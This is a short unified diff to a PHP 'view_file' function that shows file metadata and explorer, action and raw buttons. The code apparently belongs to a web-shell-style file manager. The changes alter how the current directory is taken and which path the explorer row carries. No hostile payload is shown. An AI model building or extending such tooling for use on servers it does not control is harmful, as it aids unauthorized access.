@@ -510,7 +510,7 @@ if(!function_exists('view_file')){
 	function view_file($file, $type, $preserveTimestamp='true'){
 		$output = "";
 		if(is_file($file)){
-			$dir = dirname($file);
+			$dir = get_cwd();
 
 			$owner = "";
 			if(!is_win()){
@@ -587,8 +587,6 @@ if(!function_exists('view_file')){
 			}
 			else $content = "<pre>".html_safe(read_file($file))."</pre>";
 
-
-
 			$output .= "
 	<table id='viewFile' class='boxtbl'>
 	<tr><td style='width:120px;'>Filename</td><td>".html_safe($file)."</td></tr>
@@ -599,7 +597,7 @@ if(!function_exists('view_file')){
 	<tr><td>Create time</td><td>".@date("d-M-Y H:i:s",filectime($file))."</td></tr>
 	<tr><td>Last modified</td><td>".@date("d-M-Y H:i:s",filemtime($file))."</td></tr>
 	<tr><td>Last accessed</td><td>".@date("d-M-Y H:i:s",fileatime($file))."</td></tr>
-	<tr data-path='".html_safe($file)."'><td colspan='2'>
+	<tr data-path='".html_safe($dir)."'><td colspan='2'>
 	<span class='navigate button' style='width:120px;'>explorer</span>
 	<span class='action button' style='width:120px;'>action</span>
 	<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'raw');hide_box();\">raw</span>
